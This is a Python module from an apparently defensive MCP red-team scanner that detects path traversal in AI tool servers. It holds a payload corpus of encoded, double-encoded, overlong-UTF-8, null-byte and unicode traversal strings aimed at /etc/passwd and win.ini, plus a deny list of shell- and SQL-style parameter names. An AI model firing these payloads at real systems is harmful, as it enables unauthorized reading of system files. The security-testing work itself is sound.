"""
B3 — Path Traversal Controlled Probe.

Deterministic, schema-aware path-traversal detection for MCP tools that accept
file-path-like parameters.

Design principles:
- Payloads are immutable, structured, and carry full provenance metadata.
- The default corpus uses only safe, read-only, well-known proof targets.
- A successful traversal is confirmed only by a target-file content signature,
  not by directory listings, error text, or payload reflection.
- Required dangerous sibling parameters are never invented.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any

from src.attack_base import AttackModule
from src.models import (
    Evidence,
    EvidenceType,
    Fixability,
    Finding,
    ReplayInfo,
    Severity,
)
from src.probe_engine import ProbeEngine


# ── Verdict Contract ──

PT_VERDICT_CONFIRMED_FILE_READ = "confirmed_file_read"
PT_VERDICT_SUSPECTED = "suspected"
PT_VERDICT_INCONCLUSIVE = "inconclusive"
PT_VERDICT_NOT_TESTABLE = "not_testable"
PT_VERDICT_NOT_RUN = "not_run"


# ── Path Candidate Detection ──

# Parameter names that strongly indicate a filesystem-path argument.
_PATH_PARAM_NAMES = {
    "path",
    "file",
    "filepath",
    "file_path",
    "filename",
    "file_name",
    "directory",
    "dir",
    "folder",
}

# Suffixes that, with a leading underscore, strongly indicate a path argument.
# These intentionally exclude identifiers such as path_id, file_id, file_type,
# callback_token, etc.
_PATH_PARAM_SUFFIXES = (
    "_path",
    "_file",
    "_filepath",
    "_file_path",
    "_filename",
    "_file_name",
    "_directory",
    "_dir",
    "_folder",
)

# Required sibling parameter names that are too dangerous to fill automatically.
# If any required sibling matches, the candidate is marked not_testable.
_DANGEROUS_REQUIRED_PARAMS = {
    "command",
    "cmd",
    "exec",
    "execute",
    "shell",
    "sh",
    "script",
    "code",
    "sql",
    "query",
    "sql_query",
    "raw_query",
    "eval",
    "system",
    "os_command",
    "terminal",
    "run_command",
    "program",
}


# ── Payload Architecture ──

@dataclass(frozen=True)
class PathTraversalPayload:
    """A single path-traversal probe payload with full provenance."""

    payload_id: str
    category: str
    value: str
    platform: str
    encoding_transform: str
    target_file: str
    expected_signatures: tuple[str, ...] = ()
    safety: str = "controlled_read_only"
    source: str = ""
    reference_url: str = ""
    equivalence_group: str = ""


@dataclass
class ProbeResult:
    """Internal result of one path-traversal probe."""

    tool_name: str
    parameter: str
    payload: PathTraversalPayload
    args: dict[str, Any]
    verdict: str
    reason: str
    response: dict[str, Any] | None = None
    trace_entry_id: str | None = None


# ── Known Proof Targets ──

_UNIX_PASSWD = "/etc/passwd"
_UNIX_PASSWD_SIGNATURES = (r"(?m)^root:[^:\r\n]*:0:0:",)

_WINDOWS_WININI = r"C:\Windows\win.ini"
_WINDOWS_WININI_SIGNATURES = (
    r"\[windows\]",
    r"for 16-bit app support",
)


# ── Curated Payload Corpus ──

def _unix_payloads() -> list[PathTraversalPayload]:
    """Return the default Unix/relative traversal corpus."""
    base = _UNIX_PASSWD
    sigs = _UNIX_PASSWD_SIGNATURES
    ref = "https://owasp.org/www-community/attacks/Path_Traversal"
    pat = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md"
    owasp_wstg = "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md"

    return [
        PathTraversalPayload(
            payload_id="rel-depth-1",
            category="basic_relative",
            value="../etc/passwd",
            platform="unix",
            encoding_transform="none",
            target_file=base,
            expected_signatures=sigs,
            source="OWASP WSTG / OWASP Path Traversal",
            reference_url=owasp_wstg,
            equivalence_group="basic_relative:etc_passwd:none",
        ),
        PathTraversalPayload(
            payload_id="rel-depth-3",
            category="basic_relative",
            value="../../../etc/passwd",
            platform="unix",
            encoding_transform="none",
            target_file=base,
            expected_signatures=sigs,
            source="OWASP WSTG / OWASP Path Traversal",
            reference_url=owasp_wstg,
            equivalence_group="basic_relative:etc_passwd:none",
        ),
        PathTraversalPayload(
            payload_id="rel-depth-6",
            category="deep_traversal",
            value="../../../../../../etc/passwd",
            platform="unix",
            encoding_transform="none",
            target_file=base,
            expected_signatures=sigs,
            source="PayloadsAllTheThings deep traversal list",
            reference_url=pat,
            equivalence_group="deep_traversal:etc_passwd:none",
        ),
        PathTraversalPayload(
            payload_id="mixed-slash-backslash",
            category="mixed_separators",
            value=r"..\/..\/..\/etc/passwd",
            platform="unix",
            encoding_transform="mixed_separators",
            target_file=base,
            expected_signatures=sigs,
            source="PayloadsAllTheThings / engineering adaptation",
            reference_url=pat,
            equivalence_group="mixed_separators:etc_passwd:mixed",
        ),
        PathTraversalPayload(
            payload_id="mangled-four-dot",
            category="mangled_path",
            value="....//....//....//etc/passwd",
            platform="unix",
            encoding_transform="non_recursive_strip_bypass",
            target_file=base,
            expected_signatures=sigs,
            source="HackTricks / PayloadsAllTheThings",
            reference_url="https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html",
            equivalence_group="mangled_path:etc_passwd:four_dot",
        ),
        PathTraversalPayload(
            payload_id="encoded-dots",
            category="single_encoding",
            value="%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            platform="unix",
            encoding_transform="percent_encode_dots",
            target_file=base,
            expected_signatures=sigs,
            source="OWASP Path Traversal / PayloadsAllTheThings",
            reference_url=ref,
            equivalence_group="single_encoding:etc_passwd:encoded_dots",
        ),
        PathTraversalPayload(
            payload_id="encoded-slashes",
            category="single_encoding",
            value="..%2f..%2f..%2fetc/passwd",
            platform="unix",
            encoding_transform="percent_encode_slashes",
            target_file=base,
            expected_signatures=sigs,
            source="OWASP Path Traversal / PayloadsAllTheThings",
            reference_url=ref,
            equivalence_group="single_encoding:etc_passwd:encoded_slashes",
        ),
        PathTraversalPayload(
            payload_id="fully-encoded",
            category="single_encoding",
            value="%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            platform="unix",
            encoding_transform="percent_encode_all",
            target_file=base,
            expected_signatures=sigs,
            source="PayloadsAllTheThings",
            reference_url=pat,
            equivalence_group="single_encoding:etc_passwd:fully_encoded",
        ),
        PathTraversalPayload(
            payload_id="double-encoded-dots",
            category="double_encoding",
            value="%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            platform="unix",
            encoding_transform="double_percent_encode",
            target_file=base,
            expected_signatures=sigs,
            source="HackTricks / PayloadsAllTheThings",
            reference_url="https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html",
            equivalence_group="double_encoding:etc_passwd:double_encoded",
        ),
        PathTraversalPayload(
            payload_id="double-encoded-slashes",
            category="double_encoding",
            value="..%252f..%252f..%252fetc%252fpasswd",
            platform="unix",
            encoding_transform="double_percent_encode_slashes",
            target_file=base,
            expected_signatures=sigs,
            source="HackTricks / PayloadsAllTheThings",
            reference_url="https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html",
            equivalence_group="double_encoding:etc_passwd:double_encoded_slashes",
        ),
        PathTraversalPayload(
            payload_id="absolute-unix",
            category="absolute_path",
            value="/etc/passwd",
            platform="unix",
            encoding_transform="none",
            target_file=base,
            expected_signatures=sigs,
            source="OWASP WSTG / OWASP Path Traversal",
            reference_url=owasp_wstg,
            equivalence_group="absolute_path:etc_passwd:none",
        ),
    ]


def _windows_payloads() -> list[PathTraversalPayload]:
    """Return Windows-specific payloads. Not included by default."""
    target = _WINDOWS_WININI
    sigs = _WINDOWS_WININI_SIGNATURES
    ref = "https://owasp.org/www-community/attacks/Path_Traversal"
    pat = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md"

    return [
        PathTraversalPayload(
            payload_id="win-rel-backslash",
            category="windows_relative",
            value=r"..\..\..\Windows\win.ini",
            platform="windows",
            encoding_transform="none",
            target_file=target,
            expected_signatures=sigs,
            source="OWASP WSTG / PayloadsAllTheThings",
            reference_url=ref,
            equivalence_group="windows_relative:win_ini:none",
        ),
        PathTraversalPayload(
            payload_id="win-rel-slash",
            category="windows_relative",
            value="../../../Windows/win.ini",
            platform="windows",
            encoding_transform="forward_slash_on_windows",
            target_file=target,
            expected_signatures=sigs,
            source="OWASP WSTG",
            reference_url=ref,
            equivalence_group="windows_relative:win_ini:slash",
        ),
        PathTraversalPayload(
            payload_id="win-mixed-separator",
            category="windows_relative",
            value=r"..\../..\Windows\win.ini",
            platform="windows",
            encoding_transform="mixed_separators",
            target_file=target,
            expected_signatures=sigs,
            source="PayloadsAllTheThings / engineering adaptation",
            reference_url=pat,
            equivalence_group="windows_relative:win_ini:mixed",
        ),
        PathTraversalPayload(
            payload_id="win-encoded-backslash",
            category="windows_encoding",
            value="..%5c..%5c..%5cWindows%5cwin.ini",
            platform="windows",
            encoding_transform="percent_encode_backslashes",
            target_file=target,
            expected_signatures=sigs,
            source="OWASP Path Traversal / PayloadsAllTheThings",
            reference_url=ref,
            equivalence_group="windows_encoding:win_ini:encoded_backslash",
        ),
        PathTraversalPayload(
            payload_id="win-double-encoded",
            category="windows_encoding",
            value="%252e%252e%255c%252e%252e%255cWindows%255cwin.ini",
            platform="windows",
            encoding_transform="double_percent_encode",
            target_file=target,
            expected_signatures=sigs,
            source="PayloadsAllTheThings",
            reference_url=pat,
            equivalence_group="windows_encoding:win_ini:double_encoded",
        ),
        PathTraversalPayload(
            payload_id="win-absolute-backslash",
            category="absolute_path",
            value=r"C:\Windows\win.ini",
            platform="windows",
            encoding_transform="none",
            target_file=target,
            expected_signatures=sigs,
            source="PayloadsAllTheThings",
            reference_url=pat,
            equivalence_group="absolute_path:win_ini:none",
        ),
        PathTraversalPayload(
            payload_id="win-absolute-slash",
            category="absolute_path",
            value="C:/Windows/win.ini",
            platform="windows",
            encoding_transform="forward_slash_on_windows",
            target_file=target,
            expected_signatures=sigs,
            source="PayloadsAllTheThings",
            reference_url=pat,
            equivalence_group="absolute_path:win_ini:slash",
        ),
    ]


def _aggressive_payloads() -> list[PathTraversalPayload]:
    """Return optional aggressive/legacy payloads. Not included by default."""
    base = _UNIX_PASSWD
    sigs = _UNIX_PASSWD_SIGNATURES
    pat = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md"
    enc = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Encoding%20Transformations/README.md"

    return [
        PathTraversalPayload(
            payload_id="unicode-normalization-1",
            category="unicode_normalization",
            value="‥/‥/‥/etc/passwd",
            platform="unix",
            encoding_transform="unicode_compatibility_two_dot_leader",
            target_file=base,
            expected_signatures=sigs,
            source="PayloadsAllTheThings Encoding Transformations",
            reference_url=enc,
            equivalence_group="unicode_normalization:etc_passwd:two_dot_leader",
        ),
        PathTraversalPayload(
            payload_id="unicode-normalization-2",
            category="unicode_normalization",
            value="．．/．．/．．/etc/passwd",
            platform="unix",
            encoding_transform="unicode_fullwidth_dot",
            target_file=base,
            expected_signatures=sigs,
            source="PayloadsAllTheThings Encoding Transformations",
            reference_url=enc,
            equivalence_group="unicode_normalization:etc_passwd:fullwidth_dot",
        ),
        PathTraversalPayload(
            payload_id="overlong-utf8-slash",
            category="overlong_utf8",
            value="..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            platform="unix",
            encoding_transform="overlong_utf8_slash",
            target_file=base,
            expected_signatures=sigs,
            source="OWASP Path Traversal / PayloadsAllTheThings",
            reference_url="https://owasp.org/www-community/attacks/Path_Traversal",
            equivalence_group="overlong_utf8:etc_passwd:slash",
        ),
        PathTraversalPayload(
            payload_id="overlong-utf8-backslash",
            category="overlong_utf8",
            value="..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
            platform="unix",
            encoding_transform="overlong_utf8_backslash",
            target_file=base,
            expected_signatures=sigs,
            source="OWASP Path Traversal / PayloadsAllTheThings",
            reference_url="https://owasp.org/www-community/attacks/Path_Traversal",
            equivalence_group="overlong_utf8:etc_passwd:backslash",
        ),
        PathTraversalPayload(
            payload_id="null-byte",
            category="null_byte",
            value="../../../etc/passwd%00",
            platform="unix",
            encoding_transform="null_byte_terminate",
            target_file=base,
            expected_signatures=sigs,
            source="OWASP Path Traversal / HackTricks",
            reference_url="https://owasp.org/www-community/attacks/Path_Traversal",
            equivalence_group="null_byte:etc_passwd:terminate",
        ),
        PathTraversalPayload(
            payload_id="null-byte-suffix",
            category="null_byte",
            value="../../../etc/passwd%00.jpg",
            platform="unix",
            encoding_transform="null_byte_with_extension",
            target_file=base,
            expected_signatures=sigs,
            source="OWASP Path Traversal / HackTricks",
            reference_url="https://owasp.org/www-community/attacks/Path_Traversal",
            equivalence_group="null_byte:etc_passwd:suffix",
        ),
        PathTraversalPayload(
            payload_id="path-truncation",
            category="path_truncation",
            value="a/../../../../etc/passwd",
            platform="unix",
            encoding_transform="prefix_neutralization",
            target_file=base,
            expected_signatures=sigs,
            source="HackTricks",
            reference_url="https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html",
            equivalence_group="path_truncation:etc_passwd:prefix",
        ),
        PathTraversalPayload(
            payload_id="proxy-form",
            category="proxy_specific",
            value="..;/..;/..;/etc/passwd",
            platform="unix",
            encoding_transform="reverse_proxy_separator",
            target_file=base,
            expected_signatures=sigs,
            source="HackTricks / PayloadsAllTheThings",
            reference_url="https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html",
            equivalence_group="proxy_specific:etc_passwd:semicolon",
        ),
    ]


def build_default_payloads(
    include_windows: bool = False,
    include_aggressive: bool = False,
) -> list[PathTraversalPayload]:
    """Return the curated B3 payload corpus."""
    payloads = _unix_payloads()
    if include_windows:
        payloads.extend(_windows_payloads())
    if include_aggressive:
        payloads.extend(_aggressive_payloads())
    return payloads


# ── Schema Normalization and Safe Argument Generation ──


def get_tool_schema(tool: dict[str, Any]) -> dict[str, Any]:
    """Normalize MCP tool input schema keys."""
    schema = tool.get("input_schema", tool.get("inputSchema", {}))
    return schema if isinstance(schema, dict) else {}


def get_schema_properties(schema: dict[str, Any]) -> dict[str, Any]:
    """Return schema properties dict, defaulting to empty dict."""
    properties = schema.get("properties", {})
    return properties if isinstance(properties, dict) else {}


def get_schema_required(schema: dict[str, Any]) -> set[str]:
    """Return set of required property names."""
    required = schema.get("required", [])
    return set(required) if isinstance(required, (list, tuple)) else set()


def is_path_name(parameter_name: str) -> bool:
    """Conservative name-based path parameter detection."""
    name_lower = parameter_name.lower()
    if name_lower in _PATH_PARAM_NAMES:
        return True
    return name_lower.endswith(_PATH_PARAM_SUFFIXES)


def find_path_candidates(tool: dict[str, Any]) -> list[tuple[str, dict[str, Any]]]:
    """Return list of (parameter_name, param_schema) path candidates."""
    schema = get_tool_schema(tool)
    properties = get_schema_properties(schema)

    candidates: list[tuple[str, dict[str, Any]]] = []
    for parameter_name, param_schema in properties.items():
        if not isinstance(param_schema, dict):
            param_schema = {}
        if is_path_name(parameter_name):
            candidates.append((parameter_name, param_schema))
    return candidates


def _safe_default_for_type(param_schema: dict[str, Any]) -> Any:
    """Return a safe default for a given schema property."""
    param_type = param_schema.get("type", "string")
    if param_type == "string":
        return "test"
    if param_type == "integer":
        return 1
    if param_type == "number":
        return 1.0
    if param_type == "boolean":
        return True
    if param_type == "array":
        return []
    if param_type == "object":
        return {}
    return "test"


def _safe_value_for_param(
    parameter_name: str,
    param_schema: dict[str, Any],
) -> tuple[Any, str | None]:
    """
    Generate a safe value for a non-traversal parameter.

    Returns (value, reason) where reason is set if the parameter is dangerous
    and should not be filled automatically.
    """
    name_lower = parameter_name.lower()
    if name_lower in _DANGEROUS_REQUIRED_PARAMS:
        return (None, f"dangerous required parameter '{parameter_name}'")

    # For other path-like parameters, use a neutral filename so that required
    # sibling path arguments do not themselves become traversal probes.
    if is_path_name(parameter_name):
        return ("test.txt", None)

    # Prefer examples when available and safe.
    examples = param_schema.get("examples") or []
    if isinstance(examples, list) and examples:
        return (examples[0], None)

    # Use enum first value if present.
    enum_values = param_schema.get("enum")
    if isinstance(enum_values, list) and enum_values:
        return (enum_values[0], None)

    # Use default if provided.
    default = param_schema.get("default")
    if default is not None:
        return (default, None)

    return (_safe_default_for_type(param_schema), None)


def build_safe_arguments(
    schema: dict[str, Any],
    path_param: str,
    path_value: str,
) -> tuple[dict[str, Any], str | None]:
    """
    Build schema-valid arguments for a tool probe.

    The path parameter is set to the probe value. All required siblings are
    filled with safe defaults. If a required sibling is dangerous, the
    candidate is marked not_testable and (None, reason) is returned.
    """
    properties = get_schema_properties(schema)
    required = get_schema_required(schema)

    args: dict[str, Any] = {}
    for parameter_name, param_schema in properties.items():
        if parameter_name == path_param:
            args[parameter_name] = path_value
            continue

        if parameter_name not in required:
            # Skip optional parameters to avoid unintended side effects.
            continue

        value, reason = _safe_value_for_param(parameter_name, param_schema)
        if reason:
            return (None, reason)
        args[parameter_name] = value

    if path_param not in args:
        return (None, "path parameter missing from generated arguments")

    return (args, None)


# ── Response Evaluation ──


def _extract_text_from_response(response: dict[str, Any]) -> str:
    """Extract text content from an MCP tool response, similar to D1/S1."""
    parts: list[str] = []
    for item in response.get("content", []):
        if isinstance(item, dict) and item.get("type") == "text":
            parts.append(str(item.get("text", "")))
        elif isinstance(item, dict):
            parts.append(str(item))
        else:
            parts.append(str(item))
    return "\n".join(parts)


def is_mcp_error_response(response: dict[str, Any] | None) -> bool:
    """Return True if the response represents an MCP tool error."""
    if response is None:
        return True
    if response.get("isError") or response.get("is_error"):
        return True
    if response.get("result_type") == "error":
        return True
    return False


def _match_signature(text: str, signatures: tuple[str, ...]) -> str | None:
    """Return the first signature regex that matches the response text."""
    for signature in signatures:
        try:
            if re.search(signature, text):
                return signature
        except re.error:
            continue
    return None


# ── B3 Module ──


class B3PathTraversal(AttackModule):
    """Detect path-traversal behavior in path-capable MCP tools."""

    name = "Path Traversal Controlled Probe"
    surface = "B - Tool Invocation & Execution"
    module_id = "B3"
    description = (
        "Deterministic, schema-aware path-traversal detection for MCP tools "
        "that accept file-path-like parameters."
    )

    def __init__(
        self,
        engine: ProbeEngine,
        payloads: list[PathTraversalPayload] | None = None,
        include_windows: bool = False,
        include_aggressive: bool = False,
        max_payloads_per_candidate: int = 12,
        max_total_payloads: int = 100,
        response_max_chars: int = 10000,
    ) -> None:
        super().__init__(engine)
        self.payloads = payloads or build_default_payloads(
            include_windows=include_windows,
            include_aggressive=include_aggressive,
        )
        self.include_windows = include_windows
        self.include_aggressive = include_aggressive
        self.max_payloads_per_candidate = max_payloads_per_candidate
        self.max_total_payloads = max_total_payloads
        self.response_max_chars = response_max_chars

        self.stats: dict[str, int] = {
            "attempted": 0,
            "skipped": 0,
            "failed": 0,
            "inconclusive": 0,
            "confirmed": 0,
        }
        self.probe_results: list[ProbeResult] = []

    async def run(self) -> list[Finding]:
        """Execute deterministic path-traversal probes."""
        self.findings.clear()
        self._finding_counter = 0
        self.stats = {
            "attempted": 0,
            "skipped": 0,
            "failed": 0,
            "inconclusive": 0,
            "confirmed": 0,
        }
        self.probe_results = []

        tools = await self._get_tools()
        if not tools:
            return self.findings

        total_probes = 0
        stop_outer = False

        for tool in tools:
            if stop_outer:
                break

            tool_name = str(tool.get("name", ""))
            if not tool_name:
                continue

            candidates = find_path_candidates(tool)
            if not candidates:
                continue

            schema = get_tool_schema(tool)

            for parameter, _ in candidates:
                if total_probes >= self.max_total_payloads:
                    stop_outer = True
                    break

                # Generate a safe control request for this candidate.
                control_args, skip_reason = build_safe_arguments(
                    schema, parameter, "test.txt"
                )
                if skip_reason:
                    self.stats["skipped"] += 1
                    self.probe_results.append(
                        ProbeResult(
                            tool_name=tool_name,
                            parameter=parameter,
                            payload=_sentinel_payload(),
                            args={},
                            verdict=PT_VERDICT_NOT_TESTABLE,
                            reason=skip_reason,
                        )
                    )
                    continue

                control_response, _, control_error = await self._call_tool(
                    tool_name, control_args
                )
                control_text = ""
                if not control_error and not is_mcp_error_response(control_response):
                    control_text = _extract_text_from_response(control_response)

                # Run each traversal payload independently.
                tool_probes = 0
                candidate_confirmed: list[ProbeResult] = []

                for payload in self.payloads:
                    if tool_probes >= self.max_payloads_per_candidate:
                        break
                    if total_probes >= self.max_total_payloads:
                        stop_outer = True
                        break

                    total_probes += 1
                    tool_probes += 1
                    self.stats["attempted"] += 1

                    args, reason = build_safe_arguments(
                        schema, parameter, payload.value
                    )
                    if reason:
                        self.stats["skipped"] += 1
                        self.probe_results.append(
                            ProbeResult(
                                tool_name=tool_name,
                                parameter=parameter,
                                payload=payload,
                                args={},
                                verdict=PT_VERDICT_NOT_TESTABLE,
                                reason=reason,
                            )
                        )
                        continue

                    response, trace_entry_id, call_error = await self._call_tool(
                        tool_name, args
                    )

                    if call_error:
                        self.stats["failed"] += 1
                        self.probe_results.append(
                            ProbeResult(
                                tool_name=tool_name,
                                parameter=parameter,
                                payload=payload,
                                args=args,
                                verdict=PT_VERDICT_INCONCLUSIVE,
                                reason=f"Tool call failed: {call_error}",
                                response=response,
                                trace_entry_id=trace_entry_id,
                            )
                        )
                        continue

                    if is_mcp_error_response(response):
                        self.stats["inconclusive"] += 1
                        self.probe_results.append(
                            ProbeResult(
                                tool_name=tool_name,
                                parameter=parameter,
                                payload=payload,
                                args=args,
                                verdict=PT_VERDICT_INCONCLUSIVE,
                                reason="Tool returned an error response.",
                                response=response,
                                trace_entry_id=trace_entry_id,
                            )
                        )
                        continue

                    text = _extract_text_from_response(response)
                    matched_signature = _match_signature(text, payload.expected_signatures)

                    if matched_signature:
                        self.stats["confirmed"] += 1
                        result = ProbeResult(
                            tool_name=tool_name,
                            parameter=parameter,
                            payload=payload,
                            args=args,
                            verdict=PT_VERDICT_CONFIRMED_FILE_READ,
                            reason=f"Target file signature matched: {matched_signature}",
                            response=response,
                            trace_entry_id=trace_entry_id,
                        )
                        self.probe_results.append(result)
                        candidate_confirmed.append(result)
                        continue

                    self.stats["inconclusive"] += 1
                    self.probe_results.append(
                        ProbeResult(
                            tool_name=tool_name,
                            parameter=parameter,
                            payload=payload,
                            args=args,
                            verdict=PT_VERDICT_INCONCLUSIVE,
                            reason="Response did not contain expected target-file signature.",
                            response=response,
                            trace_entry_id=trace_entry_id,
                        )
                    )

                if candidate_confirmed:
                    control_had_signature = _match_signature(
                        control_text,
                        tuple(
                            sig
                            for r in candidate_confirmed
                            for sig in r.payload.expected_signatures
                        ),
                    ) is not None
                    self._emit_candidate_finding(
                        tool_name,
                        parameter,
                        control_args,
                        control_response,
                        candidate_confirmed,
                        suspected=bool(control_error or control_had_signature),
                    )

        return self.findings

    async def _get_tools(self) -> list[dict[str, Any]]:
        """Return tools from Phase 0 context or live discovery."""
        phase0 = self.get_phase0_context()
        tools = phase0.get("tools") if isinstance(phase0, dict) else None
        if isinstance(tools, list):
            return tools
        try:
            return await self.engine.list_tools()
        except Exception:
            return []

    async def _call_tool(
        self,
        tool_name: str,
        args: dict[str, Any],
    ) -> tuple[dict[str, Any] | None, str | None, str | None]:
        """Call a tool via ProbeEngine and return (response, trace_id, error)."""
        try:
            response = await self.engine.call_tool(tool_name, args)
        except Exception as exc:
            trace_id = self._find_last_trace_id(tool_name, args)
            return (None, trace_id, str(exc))

        trace_id = self._find_last_trace_id(tool_name, args)
        return (response, trace_id, None)

    def _find_last_trace_id(
        self,
        tool_name: str,
        args: dict[str, Any],
    ) -> str | None:
        """Return the trace ID of the most recent matching tool call."""
        for trace in reversed(getattr(self.engine, "traces", [])):
            if (
                getattr(trace, "method", None) == "tools/call"
                and getattr(trace, "request", {}).get("name") == tool_name
                and getattr(trace, "request", {}).get("arguments") == args
            ):
                return getattr(trace, "id", None)
        return None

    def _emit_candidate_finding(
        self,
        tool_name: str,
        parameter: str,
        control_args: dict[str, Any],
        control_response: dict[str, Any] | None,
        confirmed_results: list[ProbeResult],
        suspected: bool,
    ) -> None:
        """Emit one finding aggregating all confirmed payloads for a candidate."""
        verdict = PT_VERDICT_SUSPECTED if suspected else PT_VERDICT_CONFIRMED_FILE_READ
        severity = Severity.MEDIUM if suspected else Severity.HIGH

        confirmed_payload_ids = [r.payload.payload_id for r in confirmed_results]
        target_files = sorted({r.payload.target_file for r in confirmed_results})
        categories = sorted({r.payload.category for r in confirmed_results})

        title = (
            f"Path traversal suspected in '{tool_name}.{parameter}'"
            if suspected
            else f"Path traversal confirmed in '{tool_name}.{parameter}'"
        )

        evidence_items: list[Evidence] = [
            Evidence(
                type=EvidenceType.TOOL_INVOCATION,
                request={
                    "tool": tool_name,
                    "arguments": control_args,
                    "role": "control",
                },
                response=self._truncate_response(control_response),
            ),
        ]

        for result in confirmed_results:
            evidence_items.append(
                Evidence(
                    type=EvidenceType.RESOURCE_READ,
                    request={
                        "tool": tool_name,
                        "arguments": result.args,
                        "payload_id": result.payload.payload_id,
                        "category": result.payload.category,
                        "value": result.payload.value,
                        "target_file": result.payload.target_file,
                        "encoding_transform": result.payload.encoding_transform,
                        "platform": result.payload.platform,
                    },
                    response=self._truncate_response(result.response),
                    trace_entry_id=result.trace_entry_id,
                )
            )

        description = (
            f"The MCP tool '{tool_name}' accepted traversal-style input in parameter "
            f"'{parameter}' and returned known file content for "
            f"{', '.join(target_files)}. Successful payload IDs: "
            f"{', '.join(confirmed_payload_ids)}. Verdict: {verdict}."
        )

        attack_narrative = (
            "1. Inspected Phase 0 / live tool schema\n"
            f"2. Identified path parameter '{parameter}' in '{tool_name}'\n"
            f"3. Generated safe control arguments: {control_args}\n"
            f"4. Sent control request to establish baseline\n"
            f"5. Sent {len(confirmed_results)} traversal payload(s): "
            f"{', '.join(confirmed_payload_ids)}\n"
            f"6. Observed target-file signatures for {', '.join(target_files)}\n"
            f"7. Categories exercised: {', '.join(categories)}\n"
            f"8. Verdict: {verdict}"
        )

        self.add_finding(
            Finding(
                id=self._next_finding_id(),
                title=title,
                surface=self.surface,
                module=f"{self.module_id} - {self.name}",
                severity=severity,
                fixability=Fixability.DESIGN,
                fixability_rationale=(
                    "File path handling requires canonicalization and "
                    "base-directory allowlist design."
                ),
                description=description,
                attack_narrative=attack_narrative,
                evidence=evidence_items,
                replay=ReplayInfo(
                    command=(
                        f"mcp-redteam replay --finding "
                        f"{self.module_id}-{self._finding_counter:03d} "
                        f"--target {self.engine.config.endpoint_url}"
                    ),
                    trace_file=(
                        f"traces/{self.module_id}-"
                        f"{self._finding_counter:03d}.json"
                    ),
                ),
                recommendation=(
                    "Canonicalize paths (e.g., realpath/getAbsolutePath), enforce a "
                    "strict base-directory allowlist, reject traversal sequences, and "
                    "avoid returning raw filesystem errors to callers."
                ),
            )
        )

    def _truncate_response(
        self,
        response: dict[str, Any] | None,
    ) -> dict[str, Any] | None:
        """Bound response size stored in evidence."""
        if response is None:
            return None
        text = _extract_text_from_response(response)
        if len(text) > self.response_max_chars:
            truncated = text[: self.response_max_chars] + "... [truncated]"
            return {
                "isError": is_mcp_error_response(response),
                "truncated_text": truncated,
                "original_size": len(text),
            }
        return response


def _sentinel_payload() -> PathTraversalPayload:
    """Placeholder payload for non-testable candidate records."""
    return PathTraversalPayload(
        payload_id="not-testable",
        category="not_testable",
        value="",
        platform="none",
        encoding_transform="none",
        target_file="",
        expected_signatures=(),
    )
